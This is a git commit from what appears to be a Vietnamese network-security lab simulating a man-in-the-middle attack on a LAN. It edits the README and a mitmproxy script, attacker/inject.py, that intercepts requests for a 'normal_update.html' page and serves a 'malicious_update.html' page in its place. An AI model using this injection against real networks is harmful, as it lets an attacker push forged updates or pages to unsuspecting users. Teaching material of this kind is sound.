0aeeea755da61114253fa481624b66a8d2e67ae9
Trung Kien Luu <kienluu2703@icloud.com>
2024-09-13 15:41:36 +0700

    modify README and injection code

--- README.md
+++ README.md
@@ -7,4 +7,4 @@
 Một người dùng thực hiện truy cập vào một trang web để học hỏi thêm về môn An toàn mạng. Một ngày kia, khi đăng nhập thành công bỗng có một thông báo về một bản cập nhật bảo mật quan trọng. Người ấy cảm thấy lo lắng và thực hiện cập nhật ngay. Thế nhưng sau khi nhấn nút cập nhật trên trang, họ lại nhận được một trang web khác có nội dung kì quặc. Điều gì đã xảy ra? Được biết là trang web này được triển khai trong một mạng LAN; người dùng tương tác với một web server.
 ## Link
 - Video youtube demo:
-- notion phân tích vấn đề: https://-vert-.notion.site/Lab-m-ph-ng-MITM-306fc414131f433e886321efc0c2b5c7
+- Notion phân tích vấn đề tại đây[https://-vert-.notion.site/Lab-m-ph-ng-MITM-306fc414131f433e886321efc0c2b5c7]
--- attacker/inject.py
+++ attacker/inject.py
@@ -1,6 +1,17 @@
 from mitmproxy import http
-def response(flow: http.HTTPFlow) -> None:
-    if flow.request.pretty_url.endswith("normal_update.html"):
-        with open("malicious_update.html", "r") as f:
-            flow.response = http.HTTPResponse.make(200, f.read(), {"Content-Type":"text/html"})
+import time
 
+def request(flow: http.HTTPFlow) -> None:
+    if flow.request.pretty_url.endswith("normal_update.html"):
+        with open("malicious_update.html", "rb") as f:
+            content_bytes = f.read()
+        flow.response = http.Response(
+            http_version=b"HTTP/1.1",
+            reason=b"OK",
+            trailers=None,
+            timestamp_start=flow.request.timestamp_start,
+            timestamp_end=time.time(),
+            status_code=200,
+            content=content_bytes,
+            headers=[(b"Content-Type", b"text/html")]
+        )
